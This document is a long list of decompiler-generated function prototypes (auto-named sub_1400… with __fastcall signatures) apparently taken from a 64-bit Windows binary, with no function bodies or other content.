_DWORD *__fastcall sub_1400A2640(__int64 a1);
__int64 __fastcall sub_1400A27A0(__int64 *a1, _BYTE *a2, unsigned int a3);
__int64 __fastcall sub_1400A2800(__int64 (__fastcall *a1)(__int64, char **), __int64 a2, __int64 a3, __int64 a4, unsigned int *a5, char *a6, int a7, __int64 (__fastcall *a8)(char *, __int64, __int64, _BYTE *), _BYTE *a9);
__int64 __fastcall sub_1400A2C30(_QWORD *a1, int *a2, char **a3, const char *a4, __int64 a5, __int64 (__fastcall *a6)(char *, __int64, _QWORD, _BYTE *), void *a7);
int __fastcall sub_1400A2E30(_BYTE *a1, int a2, int a3, _BYTE *a4);
__int64 __fastcall sub_1400A2F60(_BYTE *a1, _BYTE *a2, int a3, unsigned __int8 *a4);
__int64 __fastcall sub_1400A3070(__int64 *a1, char *a2, int *a3, __int64 (__fastcall *a4)(char *, __int64, _QWORD, _BYTE *), _BYTE *Src);
__int64 __fastcall sub_1400A3350(const char *a1, __int64 *a2);
__int64 __fastcall sub_1400A3630(__int64 a1, _QWORD *a2, _QWORD *a3, _QWORD *a4, _DWORD *a5);
__int64 __fastcall sub_1400A3D50(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5);
__int64 __fastcall sub_1400A4030(char *a1, const char *a2);
__int64 __fastcall sub_1400A4340(char **a1, void *a2, int a3);
__int64 __fastcall sub_1400A4410(_BYTE *a1, const char *a2);
_BOOL8 __fastcall sub_1400A44B0(_QWORD *a1);
_BOOL8 __fastcall sub_1400A44E0(_QWORD *a1);
void __fastcall sub_1400A4510(__int64 **a1, __int64 a2);
__int64 __fastcall sub_1400A4560(__int64 *a1, _BYTE *a2);
__int64 __fastcall sub_1400A45F0(__int64 *a1, _BYTE *a2, int a3, __int64 a4, int a5, __int64 a6);
__int64 __fastcall sub_1400A46A0(__int64 *a1, _BYTE *a2, int a3, unsigned int a4, int a5, __int64 a6);
__int64 __fastcall sub_1400A4700(__int64 a1, __int64 *a2);
void *sub_1400A4750();
void *sub_1400A4760();
__int64 __fastcall sub_1400A4770(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_1400A4790(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
void *sub_1400A47B0();
void *sub_1400A47C0();
__int64 __fastcall sub_1400A47D0(__int64 *a1, void **a2);
__int64 __fastcall sub_1400A4840(void ****a1);
void __fastcall sub_1400A4900(__int64 *a1);
__int64 __fastcall sub_1400A4980(__int64 a1, unsigned int ***a2, int a3, __int64 a4, __int64 a5);
void *sub_1400A49C0();
void *sub_1400A49D0();
__int64 __fastcall sub_1400A49E0(__int64 *a1, char **a2, int a3, __int64 a4, unsigned int a5, int a6, char a7, __int64 a8);
__int64 __fastcall sub_1400A4C00(unsigned int *a1);
void __fastcall sub_1400A4C20(unsigned int *a1);
__int64 sub_1400A4C40();
__int64 __fastcall sub_1400A4C60(unsigned int *a1);
void __fastcall sub_1400A4C80(unsigned int *a1);
void *sub_1400A4CA0();
__int64 sub_1400A4CB0();
__int64 __fastcall sub_1400A4CD0(__int64 a1, unsigned int **a2);
_BOOL8 __fastcall sub_1400A4E30(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400A4F80(unsigned int *a1, unsigned __int8 **a2);
__int64 __fastcall sub_1400A4FA0(unsigned int *a1, unsigned __int8 **a2);
void __fastcall sub_1400A5030(void **a1);
void __fastcall sub_1400A5050(void *a1);
__int64 __fastcall sub_1400A5070(__int64 a1);
__int64 __fastcall sub_1400A5290(__int64 a1);
void __fastcall sub_1400A5410(unsigned int *a1);
__int64 __fastcall sub_1400A5430(__int64 a1, _DWORD *a2);
__int64 __fastcall sub_1400A5470(__int64 a1);
__int64 __fastcall sub_1400A5490(__int64 a1);
__int64 __fastcall sub_1400A54B0(__int64 a1, _DWORD *a2);
_BOOL8 __fastcall sub_1400A54F0(__int64 a1);
void __fastcall sub_1400A5500(unsigned int *a1);
void *sub_1400A5520();
__int64 sub_1400A5530();
void *sub_1400A5550();
void *sub_1400A5560();
void *sub_1400A5570();
void __fastcall sub_1400A5580(unsigned int *a1);
void *sub_1400A55A0();
__int64 sub_1400A55B0();
void __fastcall sub_1400A55D0(unsigned int *a1);
__int64 sub_1400A55F0();
__int64 sub_1400A5610();
int *__fastcall sub_1400A5630(__int64 a1, __int64 a2, unsigned int *a3);
__int64 __fastcall sub_1400A5820(__int64 a1, unsigned int *a2, __int64 a3, unsigned int a4);
void *sub_1400A5910();
void *sub_1400A5920();
__int64 __fastcall sub_1400A5930(int a1, __int64 *a2);
void *sub_1400A5970();
void *sub_1400A5980();
__int64 __fastcall sub_1400A5990(__int64 a1, __int64 a2, __int64 a3, unsigned int a4);
__int64 __fastcall sub_1400A5AB0(__int64 a1, __int64 a2, unsigned int *a3);
void __fastcall sub_1400A5CD0(unsigned int *a1);
void __fastcall sub_1400A5CF0(unsigned int *a1);
__int64 __fastcall sub_1400A5D10(__int64 a1, unsigned int *a2);
void __fastcall sub_1400A5E00(unsigned int *a1);
__int64 __fastcall sub_1400A5E20(__int64 a1, unsigned int *a2);
int *__fastcall sub_1400A5F40(__int64 a1, _BYTE *a2);
__int64 __fastcall sub_1400A6000(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_1400A60B0(__int64 a1, unsigned int *a2, int a3);
__int64 __fastcall sub_1400A6160(__int64 a1, __int64 a2, __int64 a3, unsigned int a4);
__int64 __fastcall sub_1400A6240(__int64 a1, __int64 a2, __int64 a3);
int *__fastcall sub_1400A6430(int **a1, _BYTE *a2);
unsigned int *__fastcall sub_1400A6570(__int64 a1, __int64 a2, unsigned int *a3);
__int64 __fastcall sub_1400A6740(__int64 a1, unsigned int **a2, __int64 a3, unsigned int a4);
void *sub_1400A67C0();
void *sub_1400A67D0();
void __fastcall sub_1400A67E0(unsigned int *a1);
__int64 __fastcall sub_1400A6800(__int64 a1, unsigned int *a2, __int64 a3, unsigned int a4, __int64 a5);
void *sub_1400A69D0();
void *sub_1400A69E0();
_BOOL8 __fastcall sub_1400A69F0(__int64 a1, __int64 *a2, __int64 a3, int a4);
void *sub_1400A6A70();
void *sub_1400A6A80();
__int64 *__fastcall sub_1400A6A90(__int64 a1, __int64 a2, unsigned int *a3);
int __fastcall sub_1400A6EB0(int **a1, __int64 *a2);
__int64 __fastcall sub_1400A6FD0(__int64 a1);
__int64 __fastcall sub_1400A7410(__int64 a1);
void __fastcall sub_1400A76A0(unsigned int *a1);
__int64 __fastcall sub_1400A76C0(__int64 a1, int a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_1400A7820(__int64 a1, int a2);
__int64 __fastcall sub_1400A78D0(__int64 a1, __int64 a2, int a3, const char *a4);
void *sub_1400A7A90();
__int64 __fastcall sub_1400A7AA0(__int64 a1, unsigned int *a2, __int64 a3, unsigned int a4);
void *sub_1400A7D60();
void *sub_1400A7D70();
void *sub_1400A7D80();
void *sub_1400A7D90();
int *__fastcall sub_1400A7DA0(__int64 a1, __int64 a2, unsigned int *a3);
int __fastcall sub_1400A84E0(const void ****a1, const void ****a2);
void __fastcall sub_1400A8530(unsigned int *a1);
int __fastcall sub_1400A8550(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_1400A87A0(int *a1, int a2);
__int64 __fastcall sub_1400A8AD0(int *a1, __int16 a2, char *a3);
__int64 __fastcall sub_1400A8B50(int *a1, int a2, char *a3, _BYTE *a4, int a5);
__int64 __fastcall sub_1400A8BD0(int *a1);
__int64 __fastcall sub_1400A8CA0(unsigned int *a1);
__int64 __fastcall sub_1400A90E0(char *a1, const void **a2, int a3, unsigned __int8 a4);
__int64 __fastcall sub_1400A9190(__int64 a1, unsigned int a2, unsigned int *a3, int a4);
__int64 __fastcall sub_1400A92D0(__int64 a1, int a2, unsigned __int8 a3, __int64 a4);
__int64 __fastcall sub_1400A94B0(int *a1, __int16 a2, char *a3);
__int64 __fastcall sub_1400A9600(__int64 *a1, _BYTE *a2, int a3);
__int64 __fastcall sub_1400A9700(__int64 *a1, char *a2, char *a3, int a4);
_QWORD *__fastcall sub_1400A9970(int *a1, int a2, char *a3);
__int64 __fastcall sub_1400A9A40(const void *a1, char *a2, int a3);
int __fastcall sub_1400A9C40(__int64 *a1, __int64 *a2);
int __fastcall sub_1400A9C60(__int64 *a1, __int64 *a2);
void __fastcall sub_1400A9C80(void **a1);
char *__fastcall sub_1400A9CD0(unsigned int **a1, char *a2, int a3);
__int64 __fastcall sub_1400AA0C0(__int64 a1);
__int64 __fastcall sub_1400AA0D0(__int64 a1);
__int64 __fastcall sub_1400AA0E0(__int64 a1);
__int64 __fastcall sub_1400AA0F0(__int64 a1, _QWORD *a2, _QWORD *a3);
__int64 __fastcall sub_1400AA110(int **a1);
__int64 __fastcall sub_1400AA130(char *a1, int a2, _DWORD *a3);
__int64 __fastcall sub_1400AA3E0(_BYTE *a1, int a2, unsigned int a3);
__int64 __fastcall sub_1400AA590(__int64 a1, _BYTE *a2, int a3, int a4, int a5);
const char *__fastcall sub_1400AA5D0(unsigned int a1);
__int64 __fastcall sub_1400AA600(__int64 a1, _BYTE **a2, int a3, int a4, int a5, int a6, int a7);
_BOOL8 __fastcall sub_1400AAF40(__int64 a1, unsigned int a2, char a3, char a4, int a5);
__int64 __fastcall sub_1400AB060(_DWORD **a1, char *a2, int a3, int a4, int a5);
__int64 __fastcall sub_1400AB090(_DWORD **a1, char *a2, int a3, int a4, int a5, int a6, int a7);
__int64 __fastcall sub_1400AB5B0(char a1, _BYTE **a2);
__int64 __fastcall sub_1400AB5C0(); // weak
__int64 __fastcall sub_1400AB5E0(int a1, _BYTE **a2);
__int64 __fastcall sub_1400AB610(unsigned int a1, _BYTE **a2);
__int64 __fastcall sub_1400AB650(unsigned int a1, _DWORD *a2);
__int64 __fastcall sub_1400AB680(char *a1, int a2, int a3, __int64 (__fastcall *a4)(__int64, __int64), __int64 a5);
__int64 __fastcall sub_1400AB790(unsigned int a1, int *a2);
unsigned int *__fastcall sub_1400AB870(unsigned int **a1, __int64 a2, int a3, char *a4, int a5);
unsigned int *__fastcall sub_1400AB930(unsigned int **a1, char *a2, int a3, char *a4, int a5);
__int64 __fastcall sub_1400AB9F0(__int64 a1);
_BOOL8 __fastcall sub_1400ABA00(__int64 *a1, int a2, char *a3, int a4);
_BOOL8 __fastcall sub_1400ABAF0(__int64 *a1, __int64 a2);
__int64 __fastcall sub_1400ABB70(__int64 a1, unsigned int *a2, int a3, int a4);
unsigned int *__fastcall sub_1400ABCC0(__int64 a1, char *a2, int a3, char *a4, int a5, int a6, int a7);
__int64 __fastcall sub_1400ABD30(__int64 a1, int a2);
__int64 __fastcall sub_1400ABE10(unsigned int **a1);
__int64 __fastcall sub_1400ABE40(__int64 *a1, int a2);
__int64 __fastcall sub_1400ABE90(unsigned int **a1, unsigned int a2, int a3);
__int64 __fastcall sub_1400ABEE0(unsigned int **a1, __int64 a2, int a3);
__int64 __fastcall sub_1400ABF90(__int64 a1);
__int64 __fastcall sub_1400ABFB0(struct _exception *a1, __int64 a2);
_DWORD *__fastcall sub_1400AC100(_DWORD *a1, __time64_t a2, int a3, int a4);
__int64 __fastcall sub_1400AC1C0(int *a1);
void __fastcall sub_1400AC200(unsigned int *a1);
void *sub_1400AC220();
__int64 __fastcall sub_1400AC230(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400AC280(__int64 a1, __int64 a2, int a3, unsigned int a4);
void __fastcall sub_1400AC4D0(__int64 a1, unsigned int *a2, unsigned int a3, int a4);
__int64 __fastcall sub_1400AC620(__int64 a1, __int64 a2, unsigned int *a3, int a4, unsigned int a5);
__int64 __fastcall sub_1400AC7C0(__int64 a1, int *a2, __int64 a3, _DWORD *a4);
__int64 __fastcall sub_1400AC860(__int64 a1, int *a2, __int64 a3, _DWORD *a4);
__int64 __fastcall sub_1400AC900(__int64 a1, int a2, _DWORD *a3, int *a4);
__int64 __fastcall sub_1400AC920(__int64 a1, int a2, _DWORD *a3, int *a4);
__int64 __fastcall sub_1400AC940(__int64 a1, int a2);
__int64 __fastcall sub_1400AC960(__int64 a1, unsigned int a2, int a3);
__int64 __fastcall sub_1400AC980(__int64 a1);
__int64 __fastcall sub_1400AC9A0(__int64 a1, int a2, _DWORD *a3, int *a4);
bool __fastcall sub_1400AC9C0(__int64 a1);
__int64 __fastcall sub_1400AC9D0(__int64 a1);
__int64 __fastcall sub_1400AC9E0(unsigned int *a1, int a2);
__int64 __fastcall sub_1400ACA30(unsigned int *a1, unsigned int a2, int a3);
__int64 __fastcall sub_1400ACA80(unsigned int *a1, __int64 a2, int a3);
__int64 __fastcall sub_1400ACB10(unsigned int *a1);
void *sub_1400ACB40();
void __fastcall sub_1400ACB50(unsigned int *a1);
void *sub_1400ACB70();
__int64 sub_1400ACB80();
void *sub_1400ACBA0();
int *__fastcall sub_1400ACBB0(__int64 a1, __int64 a2, int *a3);
__int64 __fastcall sub_1400ACC00(__int64 a1, __int64 a2, unsigned int *a3);
void __fastcall sub_1400ACDA0(unsigned int *a1);
void __fastcall sub_1400ACDC0(unsigned int *a1);
void *sub_1400ACDE0();
void __fastcall sub_1400ACDF0(unsigned int *a1);
void *sub_1400ACE10();
void __fastcall sub_1400ACE20(unsigned int *a1);
void *sub_1400ACE40();
__int64 __fastcall sub_1400ACE50(char *a1, int a2, __int64 a3, unsigned int a4, unsigned __int64 a5, unsigned __int64 a6, unsigned __int64 a7, __int64 a8, char *a9, int a10);
__int64 __fastcall sub_1400AD0F0(__int64 a1, const __m128i *a2, __int64 a3);
__int64 __fastcall sub_1400AD560(unsigned __int8 *a1, __int64 a2, unsigned __int64 a3, unsigned __int64 a4, const __m128i *a5, _DWORD *a6);
__int64 __fastcall sub_1400AD790(__int64 a1, int a2, __int64 a3, int a4, char a5, int a6, int a7, char *a8, int *a9);
__int64 __fastcall sub_1400ADCF0(_BYTE *a1, int a2, __int64 a3, int a4, char a5, int a6, int a7, char *a8, int *a9);
__int64 __fastcall sub_1400ADDE0(__int64 a1, unsigned int a2, unsigned int a3);
__int64 __fastcall sub_1400ADE40(__int64 **a1, int a2, int a3, __int64 a4, __int64 a5, __int64 a6);
__int64 __fastcall sub_1400AE180(__int64 **a1, int a2, int *a3, int a4, __int64 a5);
__int64 __fastcall sub_1400AE570(__int64 a1, int a2, __int64 a3, __int64 a4, int *a5);
__int64 __fastcall sub_1400AE6B0(_DWORD *a1, int a2, __int64 a3);
__int64 __fastcall sub_1400AE860(__int64 a1, int a2, __int64 a3, __int64 a4, int *a5);
__int64 __fastcall sub_1400AEA40(__int64 a1, unsigned __int64 a2, __int64 *a3, __int64 a4, int a5, int *a6, __int64 a7);
unsigned int *__fastcall sub_1400AEB30(unsigned int **a1, unsigned int a2, int a3, char *a4, int a5);
unsigned int *__fastcall sub_1400AEBD0(unsigned int **a1, __int64 a2, int a3, char *a4, int a5);
__int64 __fastcall sub_1400AECC0(__int64 a1, int a2);
__int64 __fastcall sub_1400AECF0(__int64 a1, int a2, char *a3, int a4);
void **__fastcall sub_1400AEE60(void ***a1, unsigned int *a2);
unsigned int *__fastcall sub_1400AEF30(void ***a1, unsigned int a2, int a3, char *a4, int a5);
__int64 __fastcall sub_1400AEF90(unsigned int *a1);
__int64 __fastcall sub_1400AEFB0(__int64 a1);
void __fastcall sub_1400AF030(__int64 **a1);
__int64 __fastcall sub_1400AF070(__int64 a1, __int64 a2);
int *__fastcall sub_1400AF0F0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5);
_QWORD *__fastcall sub_1400AF2C0(__int64 *a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5);
__int64 __fastcall sub_1400AF3E0(__int64 a1);
__int64 __fastcall sub_1400AF400(_QWORD *a1, int *a2);
__int64 __fastcall sub_1400AF620(__int64 a1);
int *__fastcall sub_1400AF6A0(__int64 *a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, int *a6);
_QWORD *__fastcall sub_1400AF820(__int64 a1, __int64 *a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6);
__int64 __fastcall sub_1400AF960(__int64 a1, _QWORD *a2, __int64 a3, __int64 a4);
int *__fastcall sub_1400AFA00(__int64 *a1, _QWORD *a2, __int64 a3, __int64 a4, int *a5);
int *__fastcall sub_1400AFCF0(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4, int *a5);
__int64 __fastcall sub_1400B02A0(_QWORD *a1, __int64 a2, __int64 a3, int *a4);
__int64 __fastcall sub_1400B06E0(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_1400B0740(__int64 a1, __int64 a2, int *a3);
__int64 __fastcall sub_1400B0A10(__int64 a1, __int64 a2, __int64 a3, int *a4);
__int64 __fastcall sub_1400B0CD0(__int64 a1, __int64 a2, int *a3);
__int64 __fastcall sub_1400B0DF0(__int64 **a1, unsigned __int64 a2, __int64 a3, int *a4);
__int64 __fastcall sub_1400B1290(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5);
__int64 __fastcall sub_1400B12C0(__int64 a1, __int64 a2, __int64 a3, int *a4);
_BOOL8 __fastcall sub_1400B12F0(__int64 a1);
__int64 __fastcall sub_1400B1310(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4, int *a5);
__int64 *__fastcall sub_1400B1710(__int64 a1, int *a2);
int *__fastcall sub_1400B1730(__int64 *a1, _QWORD *a2, __int64 a3, unsigned __int64 a4, __int64 a5, __int64 *a6, int *a7);
_BOOL8 __fastcall sub_1400B19A0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, int *a7);
_BOOL8 __fastcall sub_1400B1B10(_QWORD *a1, __int64 a2, __int64 a3, int *a4);
__int64 __fastcall sub_1400B1C50(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7, int *a8);
void __fastcall sub_1400B1FF0(__int64 a1);
void __fastcall sub_1400B2040(_QWORD *a1);
__int64 __fastcall sub_1400B2090(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400B20F0(_QWORD *a1, _QWORD *a2, __int64 a3, __int64 a4, int *a5);
__int64 __fastcall sub_1400B2360(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4, int *a5);
__int64 __fastcall sub_1400B2430(_QWORD *a1, __int64 a2, int a3, int *a4);
__int64 __fastcall sub_1400B24D0(__int64 *a1, int *a2);
_QWORD *__fastcall sub_1400B2660(__int64 *a1, __int64 a2);
__int64 __fastcall sub_1400B27C0(__int64 *a1);
__int64 __fastcall sub_1400B28A0(_QWORD *a1, int *a2, _QWORD *a3);
__int64 __fastcall sub_1400B29A0(_QWORD *a1);
__int64 __fastcall sub_1400B2A70(__int64 a1, __int64 *a2, _QWORD *a3, const void *a4, size_t a5);
__int64 __fastcall sub_1400B2AA0(__int64 a1);
__int64 __fastcall sub_1400B2EB0(__int64 a1);
__int64 __fastcall sub_1400B2EF0(__int64 a1, __int64 a2, int a3);
char *__fastcall sub_1400B3290(void *a1, _QWORD *a2, char *a3, unsigned __int64 a4, int *a5);
__int64 __fastcall sub_1400B3450(char *a1, unsigned __int64 *a2, _BYTE *a3, size_t a4, int *a5);
void *sub_1400B3570();
__int64 __fastcall sub_1400B3580(int a1, __int64 a2);
void *sub_1400B35B0();
void *sub_1400B35C0();
void *sub_1400B35D0();
void *sub_1400B35E0();
void *sub_1400B35F0();
void *sub_1400B3600();
void *sub_1400B3610();
void *sub_1400B3620();
void *sub_1400B3630();
void *sub_1400B3640();
__int64 __fastcall sub_1400B3650(int a1, __int64 *a2, __int64 a3, __int64 *a4);
__int64 __fastcall sub_1400B36D0(int a1, __int64 a2);
void *sub_1400B3700();
void *sub_1400B3710();
void *sub_1400B3720();
__int64 __fastcall sub_1400B3730(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400B3770(__int64 a1, __int64 *a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_1400B3890(int a1, __int64 a2);
__int64 __fastcall sub_1400B38D0(int a1, __int64 *a2);
void *sub_1400B3B60();
int __fastcall sub_1400B3B70(const void ***a1, __int64 *a2);
_BOOL8 __fastcall sub_1400B3B90(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_1400B3C60(__int64 a1);
__int64 __fastcall sub_1400B3E00(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400B3ED0(__int64 *a1, __int64 a2, _DWORD *a3, __int64 a4);
_DWORD *__fastcall sub_1400B4060(__int64 a1, int a2);
_BOOL8 __fastcall sub_1400B4100(__int64 a1, unsigned int a2, int a3, char *a4, int a5);
__int64 __fastcall sub_1400B4130(__int64 a1, unsigned int a2, int a3);
__int64 __fastcall sub_1400B4150(__int64 a1);
__int64 __fastcall sub_1400B4170(_QWORD *a1, __int64 *a2);
__int64 __fastcall sub_1400B4200(int a1, unsigned __int8 *a2, __int64 a3, _BYTE *a4);
__int64 __fastcall sub_1400B4B60(int a1, unsigned __int8 *a2, unsigned int *a3);
__int64 __fastcall sub_1400B5930(int a1, unsigned __int8 *a2, _DWORD *a3, _BYTE *a4);
__int64 __fastcall sub_1400B6280(__int64 *a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_1400B6D30(int a1, int a2, int a3, int a4, int a5);
void sub_1400B6DD0();
__int64 __fastcall sub_1400B6E10(int a1);
__int64 __fastcall sub_1400B6EB0(__int64 *a1, char *a2, int a3, int a4, int a5);
void __fastcall sub_1400B6F80(_BYTE *a1);
__int64 __fastcall sub_1400B6FB0(int a1);
unsigned int *__fastcall sub_1400B70B0(const char *a1, __int64 a2);
__int64 __fastcall sub_1400B7110(const char *a1, _DWORD *a2);
__int64 __fastcall sub_1400B7140(int *a1, int a2, int a3, int a4, int a5, int a6);
__int64 __fastcall sub_1400B7210(const char *a1, int a2, __int64 a3);
__int64 __fastcall sub_1400B7560(int a1, __int64 a2, __int64 a3, int a4, __int64 a5);
__int64 __fastcall sub_1400B76D0(const char *a1, int a2);
unsigned int *__fastcall sub_1400B7780(char *a1, int a2, unsigned int a3);
__int64 __fastcall sub_1400B7C20(const char *a1, int a2, int *a3);
unsigned int *__fastcall sub_1400B7D00(const char *a1, __int64 a2, int a3, _DWORD *a4);
__int64 __fastcall sub_1400B8010(const char *a1, int a2, _DWORD *a3);
__int64 __fastcall sub_1400B80B0(const char *a1, int a2, signed int *a3, _DWORD *a4);
__int64 __fastcall sub_1400B81E0(__int64 a1, unsigned int *a2, int a3);
__int64 __fastcall sub_1400B8300(_BYTE *a1, _BYTE *a2, int **a3);
__int64 __fastcall sub_1400B8440(_BYTE *a1, int a2, int **a3);
__int64 __fastcall sub_1400B8470(_BYTE *a1, __int64 a2, int **a3);
__int64 __fastcall sub_1400B8500(_BYTE *a1, _BYTE *a2, int **a3);
void __fastcall sub_1400B8520(void **a1);
__int64 __fastcall sub_1400B8590(_QWORD *a1, _DWORD *a2);
__int64 __fastcall sub_1400B8800(__int64 a1, _QWORD *a2);
int *__fastcall sub_1400B8890(_BYTE *a1);
__int64 __fastcall sub_1400B8AA0(const char *a1);
char *__fastcall sub_1400B8BC0(char *a1);
__int64 __fastcall sub_1400B8D90(_OWORD *a1, const char *a2);
_WORD *__fastcall sub_1400B8DF0(__int64 a1, __int64 a2);
_WORD *__fastcall sub_1400B8E70(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400B8EF0(_BYTE *a1, const char *a2);
__int64 __fastcall sub_1400B8F90(char *a1, int a2, int *a3);
__int64 __fastcall sub_1400B9040(_OWORD *a1, const char *a2);
__int64 __fastcall sub_1400B91B0(_BYTE *a1, char *a2, int a3);
int __fastcall sub_1400B9240(const char *a1, const char *a2);
_DWORD *__fastcall sub_1400B92B0(__int64 a1, char *a2);
int sub_1400B9430(const char *a1, const char *a2, ...);
unsigned __int8 *__fastcall sub_1400B9490(unsigned __int8 *a1);
__int64 __fastcall sub_1400B9540(__int64 *a1, __int64 a2, _BYTE *a3, unsigned int a4, char *a5, int a6);
char *__fastcall sub_1400B9650(__int64 *a1, _BYTE *a2, unsigned int a3, char *a4, int a5, char **a6, _DWORD *a7, int a8);
__int64 __fastcall sub_1400B9810(__int64 a1, int *a2, __int64 a3, __int64 a4, int a5, unsigned int a6, _BYTE *a7, _BYTE *a8);
char *sub_1400B9AB0();
__int64 __fastcall sub_1400B9AD0(void *a1, int a2, int a3, __int64 a4, int a5);
__int64 __fastcall sub_1400B9BD0(_BYTE *a1, char *a2, int a3);
__int64 __fastcall sub_1400B9D50(__int64 a1, _BYTE *a2, int *a3);
__int64 __fastcall sub_1400B9DC0(_QWORD *a1);
__int64 __fastcall sub_1400B9DD0(int *a1, _BYTE *a2, _DWORD *a3, unsigned __int8 *a4, int a5);
void __fastcall sub_1400B9FA0(void *a1);
void *__fastcall sub_1400B9FD0();
__int64 __fastcall sub_1400BA000(_BYTE *a1, __int64 a2, int a3);
void __fastcall sub_1400BA100(int *a1, _BYTE *a2, unsigned int *a3);
__int64 __fastcall sub_1400BA180(_DWORD *a1);
__int64 __fastcall sub_1400BA190(int *a1, _BYTE *a2, _DWORD *a3, char *a4, int a5);
int *__fastcall sub_1400BA300(__int64 a1, __int64 a2, unsigned int *a3);
int *__fastcall sub_1400BA4A0(__int64 a1, __int64 a2, unsigned int *a3);
int *__fastcall sub_1400BA5F0(__int64 a1, unsigned int *a2, int *a3);
__int64 __fastcall sub_1400BA900(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400BAB70(__int64 a1, __int64 a2, __int64 a3, int a4, char *a5, int a6);
__int64 __fastcall sub_1400BADF0(__int64 a1, int *a2, int a3);
__int64 __fastcall sub_1400BAF70(__int64 a1, int *a2);
__int64 __fastcall sub_1400BB090(__int64 a1, __int64 a2, __int64 a3);
_BOOL8 __fastcall sub_1400BB160(__int64 a1, char *a2, __int64 a3);
int *__fastcall sub_1400BB240(__int64 a1, int *a2, int *a3);
__int64 __fastcall sub_1400BB4E0(__int64 a1, __int64 a2, __int64 a3);
int *__fastcall sub_1400BB510(__int64 a1, __int64 a2, unsigned int *a3);
__int64 __fastcall sub_1400BB5F0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5);
__int64 __fastcall sub_1400BB770(__int64 a1, const char *a2, char *a3);
__int64 __fastcall sub_1400BB790(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400BB7B0(__int64 a1, const char *a2, char *a3);
__int64 __fastcall sub_1400BB7D0(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400BB7F0(__int64 a1);
__int64 __fastcall sub_1400BB850(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400BB880(__int64 a1, unsigned int *a2, __int64 a3, unsigned int a4);
int *__fastcall sub_1400BBA10(__int64 a1, __int64 a2, _BYTE *a3);
void *sub_1400BBCF0();
void *sub_1400BBD00();
void *sub_1400BBD10();
void *sub_1400BBD20();
void *sub_1400BBD30();
void *sub_1400BBD40();
void __fastcall sub_1400BBD50(unsigned int *a1);
void __fastcall sub_1400BBD70(unsigned int *a1);
__int64 __fastcall sub_1400BBD90(__int64 a1, unsigned int *a2, int a3);
__int64 __fastcall sub_1400BC110(int *a1, unsigned int *a2);
__int64 __fastcall sub_1400BC1E0(__int64 a1, unsigned int *a2, int a3);
_WORD *__fastcall sub_1400BC4E0(__int64 a1, __int64 a2, unsigned int a3);
void *sub_1400BC650();
int *__fastcall sub_1400BC660(__int64 a1, __int64 *a2, int *a3);
__int64 __fastcall sub_1400BC6B0(__int64 a1, __int64 a2, unsigned int *a3);
void __fastcall sub_1400BC850(void *a1);
__int64 __fastcall sub_1400BC8B0(unsigned __int8 *a1, int a2);
__int64 __fastcall sub_1400BC980(__int64 a1, __int64 a2);
struct tm *__fastcall sub_1400BCA70(const __time64_t *a1, __int64 a2);
__int64 __fastcall sub_1400BCAB0(int *a1, int a2, int a3);
__int64 __fastcall sub_1400BCC60(_DWORD *a1, int a2, int a3, int *a4, int *a5);
_DWORD *__fastcall sub_1400BCDA0(_DWORD *a1, __time64_t a2, int a3, int a4);
__int64 __fastcall sub_1400BCF50(int *a1);
__int64 __fastcall sub_1400BCF70(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400BD150(int *a1, int *a2);
_DWORD *__fastcall sub_1400BD3F0(_DWORD *a1, __time64_t a2, int a3, int a4);
__int64 __fastcall sub_1400BD590(int *a1);
__int64 __fastcall sub_1400BD5B0(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400BD7E0(__int64 a1, _BYTE *a2);
__int64 __fastcall sub_1400BD890(int *a1, int *a2);
__int64 __fastcall sub_1400BDB80(__int64 a1);
__int64 __fastcall sub_1400BDC30(__int64 a1);
__int64 __fastcall sub_1400BDC60(int a1);
__int64 __fastcall sub_1400BDD00(unsigned int *a1, int a2, _DWORD *a3, int *a4);
void *sub_1400BDE30();
__int64 __fastcall sub_1400BDE40(int a1, __int64 *a2);
void *sub_1400BDE80();
__int64 __fastcall sub_1400BDE90(__int64 a1, int *a2, unsigned int *a3, __int64 a4, _DWORD *a5);
__int64 __fastcall sub_1400BDF30(__int64 a1, __int64 *a2, int *a3, unsigned int *a4, __int64 a5);
char *__fastcall sub_1400BE210(_BYTE *a1, int a2, _QWORD *a3, int *a4);
char *__fastcall sub_1400BE310(_BYTE *a1, int a2, _QWORD *a3, int *a4);
__int64 __fastcall sub_1400BE4C0(__int64 a1, const void *a2, int a3);
__int64 __fastcall sub_1400BE5C0(__int64 a1, void *a2, int a3);
__int64 __fastcall sub_1400BE670(__int64 a1, _BYTE *a2);
__int64 __fastcall sub_1400BE6C0(__int64 a1, _BYTE *a2, int a3);
__int64 __fastcall sub_1400BE7C0(__int64 a1, int a2, int a3, __int64 a4);
__int64 __fastcall sub_1400BE9C0(__int64 a1);
__int64 __fastcall sub_1400BE9E0(__int64 a1);
__int64 __fastcall sub_1400BEA00(__int64 a1);
